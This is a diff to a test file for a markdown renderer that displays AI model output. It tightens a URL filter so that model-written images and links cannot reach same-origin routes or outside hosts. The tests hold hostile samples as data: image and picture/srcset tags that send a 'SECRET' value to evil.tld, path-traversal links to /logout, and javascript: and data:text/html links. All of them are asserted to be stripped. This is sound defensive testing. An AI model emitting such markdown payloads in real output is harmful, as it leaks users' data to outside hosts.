@@ -34,13 +34,20 @@ describe("restrictModelUrls (image src)", () => {
     expect(restrictModelUrls("\u0000https://evil.tld/p.gif", "src", img)).toBeUndefined();
   });
 
-  it("keeps inline and same-origin images", () => {
+  it("keeps inline images", () => {
     expect(restrictModelUrls("data:image/png;base64,AAAA", "src", img)).toBe(
       "data:image/png;base64,AAAA"
     );
     expect(restrictModelUrls("blob:abc", "src", img)).toBe("blob:abc");
-    expect(restrictModelUrls("/local/pic.png", "src", img)).toBe("/local/pic.png");
   });
+
+  // Catches: the relative/root-relative fallthrough `return url` in the image branch
+  it.each(["/api/v1/secret", "relative.png", "./a.png", "../a.png"])(
+    "drops same-origin image %s, which would fire a credentialed GET",
+    (src) => {
+      expect(restrictModelUrls(src, "src", img)).toBeUndefined();
+    }
+  );
 });
 
 describe("restrictModelUrls (link href)", () => {
@@ -50,13 +57,23 @@ describe("restrictModelUrls (link href)", () => {
     );
     expect(restrictModelUrls("http://example.com", "href", link)).toBe("http://example.com");
     expect(restrictModelUrls("mailto:hi@trigger.dev", "href", link)).toBe("mailto:hi@trigger.dev");
-    expect(restrictModelUrls("/runs/123", "href", link)).toBe("/runs/123");
+    expect(restrictModelUrls("/orgs/acme/projects/p/runs/123", "href", link)).toBe(
+      "/orgs/acme/projects/p/runs/123"
+    );
   });
 
   it("drops unsafe link schemes", () => {
     expect(restrictModelUrls("javascript:alert(1)", "href", link)).toBeUndefined();
     expect(restrictModelUrls("data:text/html,<script>", "href", link)).toBeUndefined();
   });
+
+  // Catches: model links reaching same-origin routes like /logout or another host via //host.
+  it.each(["/logout", "//evil.example/x", "/orgs/a/../../logout", "/orgs/%2e%2e/logout", "x"])(
+    "drops a relative link outside the dashboard: %s",
+    (href) => {
+      expect(restrictModelUrls(href, "href", link)).toBeUndefined();
+    }
+  );
 
   it("keeps a valid trigger:// citation, but strips a malformed one", () => {
     expect(restrictModelUrls("trigger://proj_abc/env_123/run/run_456", "href", link)).toBe(
@@ -105,7 +122,8 @@ describe("StreamdownRenderer (rendered markdown)", () => {
       [
         "![x](https://www.google.com/s2/favicons?domain=SECRET.evil.tld)",
         "![y](//evil.tld/pixel.gif)",
-        "![z](/local/pic.png)",
+        "![z](/api/v1/secret)",
+        "![w](relative.png)",
       ].join("\n\n")
     );
 
@@ -113,8 +131,25 @@ describe("StreamdownRenderer (rendered markdown)", () => {
     expect(html).not.toContain('src="http');
     expect(html).not.toContain('src="//');
     expect(html).not.toContain("SECRET.evil.tld");
-    // A same-origin relative image is untouched, so the policy does not over-block.
-    expect(html).toContain('src="/local/pic.png"');
+    expect(html).not.toContain("/api/v1/secret");
+    expect(html).not.toContain("relative.png");
+  });
+
+  // Catches: picture/source allowed again in the sanitize schema (srcset skips urlTransform)
+  it("never renders picture/source or other elements that fetch a remote url", async () => {
+    const html = await render(
+      [
+        '<picture><source srcset="https://evil.tld/?d=SECRET"><img alt="p"></picture>',
+        '<video poster="https://evil.tld/v" src="https://evil.tld/v"></video>',
+        '<audio src="https://evil.tld/a"></audio>',
+        '<object data="https://evil.tld/o"></object>',
+        '<embed src="https://evil.tld/e">',
+        '<iframe src="https://evil.tld/i"></iframe>',
+      ].join("\n\n")
+    );
+
+    expect(html).not.toContain("evil.tld");
+    expect(html).not.toMatch(/<(picture|source|video|audio|object|embed|iframe)/);
   });
 
   it("resolves a trigger:// citation to an anchor with the resolved path", async () => {
